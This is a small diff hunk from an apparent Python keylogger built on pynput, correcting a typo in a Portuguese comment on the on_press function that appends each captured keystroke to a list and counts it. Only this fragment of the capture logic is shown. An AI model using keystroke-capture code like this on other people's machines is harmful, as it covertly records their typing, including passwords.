@@ -5,7 +5,7 @@ from pynput.keyboard import Key, Listener
 count = 0
 keys =[]
 
-def on_press(key): # resposavel capturar a tecla e chamar a função de escrita (write_file)
+def on_press(key): # responsavel capturar a tecla e chamar a função de escrita (write_file)
     global keys,count
     keys.append(key)
     count +=1
